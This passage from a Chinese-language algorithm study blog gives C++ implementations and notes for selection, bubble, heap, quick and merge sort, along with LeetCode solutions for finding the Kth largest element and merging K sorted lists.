class="string">&quot;Gold Medal&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">1</span>)&#123;</span><br><span class="line">                ans[pos]=<span class="string">&quot;Silver Medal&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">2</span>)&#123;</span><br><span class="line">                ans[pos]=<span class="string">&quot;Bronze Medal&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ans[pos]=<span class="built_in">to_string</span>(i<span class="number">+1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="1-1-选择排序">1.1 选择排序</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> data[<span class="number">5</span>] = &#123;<span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>&#125;;</span><br><span class="line">    <span class="type">int</span> length = <span class="built_in">sizeof</span>(data) / <span class="built_in">sizeof</span>(data[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length - <span class="number">1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> k = i;<span class="comment">//记录最小值索引</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; length; j++)</span><br><span class="line">            <span class="keyword">if</span> (data[k] &gt; data[j])</span><br><span class="line">                k = j;</span><br><span class="line">        <span class="type">int</span> temp = data[i];</span><br><span class="line">        data[i] = data[k];</span><br><span class="line">        data[k] = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">        cout &lt;&lt; data[i] &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-2-冒泡排序">1.2 冒泡排序</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">show_data</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">        cout &lt;&lt; data[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    cout &lt;&lt; data[len - <span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    冒泡排序，正序，大数向上冒出</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bubble_sort1</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; len &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; len - i; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (data[j - <span class="number">1</span>] &gt; data[j])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> t = data[j - <span class="number">1</span>];</span><br><span class="line">                data[j - <span class="number">1</span>] = data[j];</span><br><span class="line">                data[j] = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">show_data</span>(data, len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    冒泡排序，正序，小数向下冒出</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bubble_sort2</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; len &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = len - <span class="number">1</span>; j &gt; i; --j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (data[j] &lt; data[j - <span class="number">1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> t = data[j];</span><br><span class="line">                data[j] = data[j - <span class="number">1</span>];</span><br><span class="line">                data[j - <span class="number">1</span>] = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">show_data</span>(data, len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> data1[<span class="number">10</span>] = &#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    <span class="built_in">bubble_sort1</span>(data1, <span class="built_in">sizeof</span>(data1) / <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="type">int</span> data2[<span class="number">10</span>] = &#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    <span class="built_in">bubble_sort2</span>(data2, <span class="built_in">sizeof</span>(data2) / <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-3-堆排序（优先队列，堆，heap）">1.3 堆排序（优先队列，堆，heap）</h2>
<p><a href="https://mp.weixin.qq.com/s/FFsvWXiaZK96PtUg-mmtEw">拜托，面试别再问我TopK了！！！ (qq.com)</a><br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403022043634.png" alt="image-20221102164154244.png"></p>
<blockquote>
<p>在大根堆中，父节点的值比每一个子节点的值都要大；在小根堆中，父节点的值比每一个子节点都要小。下面的堆以大根堆为例。</p>
<p>优先队列(priority queue)可以在O(1)的时间内获取最大值，在O(logn)时间内取出最大值或者插入任意值。优先队列通常用堆(heap)实现，堆是一颗完全二叉树，其每个节点的值总是大于等于子节点的值。</p>
<p>上浮：如果一个节点比父节点大，需要交换这两个节点；交换后可能仍比新的父节点大，需要继续向上比较和交换下沉：子节点比父节点大，父节点向下交换；交换后仍需向下继续比较和交换</p>
<p>进行堆排序时，不断将堆顶元素与堆底元素交换，进行下沉操作插入元素时，把元素放在最后，进行上浮操作。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">插入元素，上浮操作</span><br><span class="line"><span class="comment">//小根堆</span></span><br><span class="line"><span class="comment">//将元素插入堆最后面，元素大小i=n（下标从1开始）</span></span><br><span class="line"><span class="built_in">InsertHeap</span>(A,i)&#123;</span><br><span class="line"> 	<span class="keyword">while</span>(i&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//与父节点比较大小</span></span><br><span class="line">        <span class="keyword">if</span>(A[i/<span class="number">2</span>]&lt;A[i])</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">swap</span>(A[i/<span class="number">2</span>],A[i]);</span><br><span class="line">        i=i/<span class="number">2</span>;</span><br><span class="line">	&#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">插入建堆（边插入元素边调整堆）</span><br><span class="line"><span class="built_in">InsBuildHeap</span>()&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        A[i]=x;</span><br><span class="line">        <span class="built_in">InsertHeap</span>(A,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">调整堆，下沉操作</span><br><span class="line"><span class="comment">//i为堆顶，k为堆底</span></span><br><span class="line"><span class="built_in">HeapRectify</span>(A,i,k)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">2</span>*i<span class="number">+1</span>&lt;=k)&#123;</span><br><span class="line">        m=<span class="built_in">min</span>(A[<span class="number">2</span>i],A[<span class="number">2</span>i<span class="number">+1</span>])	<span class="comment">//m为两者小的下标</span></span><br><span class="line">        <span class="keyword">if</span>(A[i]&gt;A[m])&#123;</span><br><span class="line">            <span class="built_in">swap</span>(A[i],A[m])</span><br><span class="line">            i=m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">2</span>*i=k&amp;&amp;A[i]&gt;A[k])&#123;</span><br><span class="line">        <span class="built_in">swap</span>(A[i],A[k]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>调整完绿色节点后，6上升，2下降，同时需要继续向下调整</p>
<p>下标从0开始，i孩子节点为，$2<em>i+1,2</em>i+2$，父节点为$\frac{i-1}{2}$<br>
下标从1开始，i孩子节点为，$2<em>i,2</em>i+1$，父节点为$\frac{i}{2}$</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202309181122126.png" alt="算法-堆.png"></p>
<h3 id="1-3-1-大根堆（筛选建堆）">1.3.1 大根堆（筛选建堆）</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//筛选建堆，从最后一个非叶子节点开始</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">builtHeap</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n=nums.<span class="built_in">size</span>()<span class="number">-1</span>;	<span class="comment">//n为最后一个元素下标</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=(n<span class="number">-1</span>)/<span class="number">2</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">        <span class="built_in">Heapify</span>(nums,i,n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用删除的调整过程建堆，时间复杂度O(n)</span></span><br><span class="line"><span class="comment">// 调整堆，从i开始调整，下沉，</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Heapify</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums,<span class="type">int</span> i,<span class="type">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="comment">//到达叶子节点</span></span><br><span class="line"> 	<span class="keyword">while</span>(<span class="number">2</span>*i<span class="number">+1</span>&lt;=heapSize)&#123;</span><br><span class="line">        <span class="type">int</span> largest=<span class="number">2</span>*i<span class="number">+1</span>;</span><br><span class="line">        <span class="comment">//存在右节点且右节点更大</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">2</span>*i<span class="number">+2</span>&lt;=heapSize&amp;&amp;nums[<span class="number">2</span>*i<span class="number">+2</span>]&gt;nums[largest])&#123;</span><br><span class="line">            largest=<span class="number">2</span>*i<span class="number">+2</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//需要进行交换</span></span><br><span class="line">        <span class="keyword">if</span>(nums[largest]&gt;nums[i])&#123;</span><br><span class="line">            <span class="built_in">swap</span>(nums[i],nums[largest]);</span><br><span class="line">            i=largest;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用插入建堆，不断插入元素，然后上浮调整，时间复杂度：O(nlogn)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertHeap</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> i=nums.<span class="built_in">size</span>()<span class="number">-1</span>;   <span class="comment">//新插入元素位置</span></span><br><span class="line">	<span class="keyword">while</span>(i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(nums[(i<span class="number">-1</span>)/<span class="number">2</span>]&gt;=nums[i])</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="built_in">swap</span>(nums[(i<span class="number">-1</span>)/<span class="number">2</span>],nums[i]);</span><br><span class="line">		i=(i<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">findKthLargest</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 建立大根堆，不断弹出堆顶元素</span></span><br><span class="line">    <span class="comment">// 通过筛选建堆</span></span><br><span class="line">    <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">    <span class="built_in">builtHeap</span>(nums);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;k;i++)&#123;</span><br><span class="line">        <span class="comment">//最大节点与底部交换</span></span><br><span class="line">        <span class="built_in">swap</span>(nums[<span class="number">0</span>],nums[n-i]);</span><br><span class="line">        <span class="built_in">Heapify</span>(nums,<span class="number">0</span>,n<span class="number">-1</span>-i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-4-快速排序">1.4 快速排序</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">srand</span>((<span class="type">unsigned</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">        <span class="built_in">quickSort</span>(nums,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">quickSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums,<span class="type">int</span> left,<span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left&gt;=right)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> l=left,r=right;</span><br><span class="line">        <span class="comment">// 随机从[left,right]中选择一个主元</span></span><br><span class="line">        <span class="type">int</span> t=<span class="built_in">rand</span>()%(right-left<span class="number">+1</span>)+left;</span><br><span class="line">        <span class="built_in">swap</span>(nums[t],nums[left]);</span><br><span class="line">        <span class="type">int</span> pivot=nums[left];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="keyword">while</span>(l&lt;r&amp;&amp;nums[r]&gt;=pivot)</span><br><span class="line">                r--;</span><br><span class="line">           	nums[l]=nums[r];</span><br><span class="line">            <span class="keyword">while</span>(l&lt;r&amp;&amp;nums[l]&lt;=pivot)</span><br><span class="line">                l++;</span><br><span class="line">            nums[r]=nums[l];</span><br><span class="line">        &#125;</span><br><span class="line">        nums[l]=pivot;</span><br><span class="line">        <span class="built_in">quickSort</span>(nums,left,l<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">quickSort</span>(nums,l<span class="number">+1</span>,right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="1-5-归并排序">1.5 归并排序</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">tmp</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="built_in">merge_sort</span>(nums, <span class="number">0</span>, n - <span class="number">1</span>, tmp);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> left, <span class="type">int</span> right, vector&lt;<span class="type">int</span>&gt; &amp;tmp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left &gt;= right)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> m = left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// cout &lt;&lt; left &lt;&lt; &quot; &quot; &lt;&lt; right &lt;&lt; endl;</span></span><br><span class="line">        <span class="built_in">merge_sort</span>(nums, left, m, tmp);</span><br><span class="line">        <span class="built_in">merge_sort</span>(nums, m + <span class="number">1</span>, right, tmp);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> p = left, q = m + <span class="number">1</span>, i = left;</span><br><span class="line">        <span class="keyword">while</span> (p &lt;= m || q &lt;= right) &#123;</span><br><span class="line">            <span class="keyword">if</span> (q &gt; right || (p &lt;= m &amp;&amp; nums[p] &lt;= nums[q])) &#123;</span><br><span class="line">                tmp[i++] = nums[p++];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp[i++] = nums[q++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = left; i &lt;= right; i++) &#123;</span><br><span class="line">            nums[i] = tmp[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="1-6-桶排序">1.6 桶排序</h2>
<h2 id="1-7-插入排序-insertion-sort">1.7 插入排序(insertion sort)</h2>
<blockquote>
<p>适用于元素基本有序的情况</p>
</blockquote>
<h2 id="1-8-题单">1.8 题单</h2>
<h3 id="1-8-1-215-数组中的第K个最大元素">1.8.1 <a href="https://leetcode.cn/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a></h3>
<h4 id="方法一：堆排序">方法一：堆排序</h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findKthLargest</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.<span class="built_in">size</span>() &lt; k) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 筛选建堆</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = (n - <span class="number">1</span>) / <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="built_in">HeapRecify</span>(nums, i, n);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行k-1次删除操作</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= k - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(nums[<span class="number">0</span>], nums[n]);</span><br><span class="line">            n--;</span><br><span class="line">            <span class="built_in">HeapRecify</span>(nums, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 筛选调整堆，i为堆顶，n为堆底</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">HeapRecify</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> i, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 存在左右孩子</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">2</span> * i + <span class="number">2</span> &lt;= n) &#123;</span><br><span class="line">            <span class="type">int</span> m;</span><br><span class="line">            <span class="keyword">if</span> (nums[<span class="number">2</span> * i + <span class="number">1</span>] &gt; nums[<span class="number">2</span> * i + <span class="number">2</span>]) &#123;</span><br><span class="line">                m = <span class="number">2</span> * i + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                m = <span class="number">2</span> * i + <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 堆顶小，向下调整</span></span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt; nums[m]) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[i], nums[m]);</span><br><span class="line">                i = m;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">2</span> * i + <span class="number">1</span> == n &amp;&amp; nums[i] &lt; nums[n]) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(nums[i], nums[n]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="方法二：快速选择">方法二：快速选择</h4>
<blockquote>
<p>快速排序算法思想的应用，快速排序每次可以确定一个元组的位置</p>
</blockquote>
<p>$$<br>
T(n)=2*T(n/2)+(n-1)<br>
$$<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406052011230.png" alt="image.png"></p>
<p>$$<br>
T(n)=n+T(n/2)<br>
$$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    找出数组中第K大的数，从0开始</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">quickSelection</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> key = nums[l];</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r &amp;&amp; nums[r] &gt;= key) &#123;</span><br><span class="line">            --r;</span><br><span class="line">        &#125;</span><br><span class="line">        nums[l] = nums[r];</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r &amp;&amp; nums[l] &lt;= key) &#123;</span><br><span class="line">            l++;</span><br><span class="line">        &#125;</span><br><span class="line">        nums[r] = nums[l];</span><br><span class="line">    &#125;</span><br><span class="line">    nums[l] = key;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">findKthLargest</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> target = nums.<span class="built_in">size</span>() - k;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="type">int</span> mid = <span class="built_in">quickSelection</span>(nums, l, r);</span><br><span class="line">        <span class="comment">// cout &lt;&lt; &quot;l&quot; &lt;&lt; l &lt;&lt; &quot; mid&quot; &lt;&lt; mid &lt;&lt; &quot; r&quot; &lt;&lt; r &lt;&lt; endl;</span></span><br><span class="line">        <span class="keyword">if</span> (mid == target)</span><br><span class="line">            <span class="keyword">return</span> nums[mid];</span><br><span class="line">        <span class="keyword">if</span> (mid &gt; target)</span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[l];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; nums = &#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">findKthLargest</span>(nums, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-8-2-23-合并-K-个升序链表-（堆）">1.8.2 <a href="https://leetcode.cn/problems/merge-k-sorted-lists/">23. 合并 K 个升序链表 </a>（堆）</h3>
<blockquote>
<p>写priority_queue的比较函数</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Comp</span>&#123;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(ListNode* a,ListNode* b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a-&gt;val&gt;b-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="function">ListNode *<span class="title">mergeKLists</span><span class="params">(vector&lt;ListNode *&gt; &amp;lists)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, ListNode *&gt; pii;</span><br><span class="line">        priority_queue&lt;ListNode*,vector&lt;ListNode*&gt;,Comp&gt; pq; <span class="comment">// 小根堆</span></span><br><span class="line">        <span class="keyword">for</span> (ListNode *list : lists) &#123;</span><br><span class="line">            <span class="keyword">if</span>(list!=<span class="literal">nullptr</span>)</span><br><span class="line">                pq.<span class="built_in">push</span>(list);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode *root = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>), *cur = root;</span><br><span class="line">        <span class="keyword">while</span> (!pq.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> p= pq.<span class="built_in">top</span>();</span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">            cur-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(p-&gt;val);</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;next != <span class="literal">nullptr</span>)</span><br><span class="line">                pq.<span class="built_in">push</span>(p-&gt;next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="1-8-3-218-天际线问题（堆）">1.8.3 <a href="https://leetcode.cn/problems/the-skyline-problem/">218. 天际线问题</a>（堆）</h3>
<blockquote>
